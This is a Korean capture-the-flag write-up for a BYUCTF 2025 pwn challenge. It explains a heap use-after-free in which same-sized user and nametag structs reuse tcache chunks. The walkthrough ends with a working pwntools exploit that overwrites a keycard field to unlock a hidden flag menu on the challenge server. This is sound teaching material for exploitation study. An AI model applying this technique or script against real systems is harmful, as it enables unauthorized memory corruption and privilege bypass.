---
tags: [ctf, write-up, pwn, system]		
---

![Image](/assets/img/byuctf2025/image1.png)

---

![Image](/assets/img/byuctf2025/image2.png)

서버에 접속하면 먼저 register_user()가 실행되며 username을 입력받는다.

![Image](/assets/img/byuctf2025/image3.png)

그 후 메인 루프에서 print_menu() 함수가 호출되어 선택 가능한 메뉴가 출력된다.

각 기능은 다음과 같다.

1. **Register a new user**
    
    → 새로운 유저를 등록하며 curr_user 구조체를 새로 할당하고 username을 다시 입력받는다.
    
2. **Learn about the Time Keepers**
    
    → 설명 메시지를 출력한다.
    
3. **Collect gear**
    
    → rand()를 통해 5가지 선택지 중 하나가 선정된다.
    
    그중 gear==2 (Name Tag)가 선정될 경우 curr_nametag를 malloc()으로 할당하고
    
    first, last 필드에 대해 각각 8바이트씩 read()로 입력을 받는다.
    
4. **Elevate to super user**
    
    → curr_user->uid가 0x600000 이상일 경우 keycard에 0x1337이 세팅된다.
    
    이 값을 만족시키면 숨겨진 옵션인 7번 (Free Loki)이 정상 작동하게 된다.
    
5. **Change characters**
    
    → log_out()을 호출해 기존 curr_user와 curr_nametag를 해제하고,
    
    다시 register_user()를 호출해 새 유저로 전환한다.
    
6. **Leave**
    
    → 루프를 종료하고 프로그램을 종료한다.
    

코드를 분석해보면, flag를 얻기 위해서는 사용자 입력을 통해 숨겨진 메뉴인 7번을 실행해야 한다.

하지만 단순히 메뉴 7번을 실행하는 것 만으로는 flag를 얻을 수 없고, 두 가지 조건을 충족해야 한다.

1. curr_user가 등록되어 있어야 한다. (!= NULL)
2. curr_user->keycard 값이 정확히 0x1337이어야 한다

즉, 사용자 등록 후 keycard 값을 0x1337로 변경해야 한다.

keycard는 프로그램 흐름상 사용자의 uid 값이 0x600000 이상일 경우에만 설정되므로, 일반적으로는 이를 만족할 수 없다. 

코드의 구조체 정의를 살펴보면, 익스플로잇에 대한 힌트를 얻을 수 있는데,

user_t와 nametag_t 두 구조체가 24바이트의 동일한 크기를 가지고 있다는 점이다.

```c
typedef struct {
    long uid;
    char username[8];
    long keycard;
} user_t;

typedef struct {
    long mfg_date;
    char first[8];
    char last[8];
} nametag_t;
```

크기가 동일한 두 구조체는 Heap 상에서 동일한 chunk 크기를 할당받으며,

free()후 재할당 시 동일한 메모리 주소에 위치할 가능성이 매우 높다. → Use-After-Free

힙이 재사용되는 것을 확인해보기 위해 gdb로 흐름을 살펴보았다.

처음 register_user로 계정 생성 후 curr_user가 가리키는 주소 :  0x5555555592a0

![Image](/assets/img/byuctf2025/image4.png)

gear 2를 이용해 curr_nametag 설정

![Image](/assets/img/byuctf2025/image5.png)

curr_nametag가 가리키는 주소 : 0x5555555592c0

![Image](/assets/img/byuctf2025/image6.png)

curr_nametag 내부

![Image](/assets/img/byuctf2025/image7.png)

메뉴 5번 (Change characters)으로 로그아웃 후 새로 계정을 생성

![Image](/assets/img/byuctf2025/image8.png)

curr_user가 가리키는 주소 : 0x5555555592c0 (기존의 curr_nametag 주소와 동일)

![Image](/assets/img/byuctf2025/image9.png)

내부를 보면 username은 새로 입력한 값으로 덮였지만, curr_user→keycard 위치에는 curr_nametag→last 값이 그대로 있는 것을 확인할 수 있다.

![Image](/assets/img/byuctf2025/image10.png)

추가로, 이때 curr_nametag는 어디를 가리키는지 궁금해서 생성한 후 확인해보니

기존의 curr_user가 가리키던 주소인 0x5555555592a0을 가리키고 있었다.

![Image](/assets/img/byuctf2025/image11.png)

즉, 0x5555555592a0, 0x5555555592c0 두 힙 청크는

동일한 크기(0x20)의 malloc과 free 과정에서 번갈아 재사용되고 있다.

tcache가 LIFO 방식으로 동작하기 때문으로 보인다.

이제 힙 재사용을 확인했으니 익스플로잇 흐름을 작성해볼 수 있다.

1. **처음 register_user()로 사용자 등록**
    
    → curr_user에 malloc(sizeof(user_t))로 힙 chunk 할당
    
2. **메뉴 3번 (Collect gear)에서 gear == 2가 나올 때까지 반복 시도**
    
    → curr_nametag에 동일한 크기의 chunk가 할당되고 read() 2번으로 first, last에 8바이트씩 입력받는데, curr_nametag→last는 curr_user→keycard를 덮게 되므로 last에 0x1337을 입력
    
3. **메뉴 5번 (Change characters)으로 curr_user와 curr_nametag를 free()한 뒤 재등록**
    
    → 같은 힙 주소를 재사용하게 되고, curr_user→keycard 값이 0x1337을 만족하게 됨
    
4. **메뉴 7번 입력**
    
    → flag 출력
    

---

### exploit.py

```c
from pwn import *

p = remote("minecraft.chal.cyberjousting.com", 1354) 

payload = p64(1234)
payload += p64(0x1337)

p.sendlineafter("username now: ",b"A"*4)

while(1): 
    p.sendlineafter("6. Leave" , "3") 
    p.recvuntil("\n")
    
    if b"your first and last name:" in p.recvuntil("\n"):
        p.sendline(payload)
        break

p.sendline("5")
p.sendlineafter("username now: ",b"A"*4)
p.sendline("7")
p.interactive()
```

![Image](/assets/img/byuctf2025/image12.png)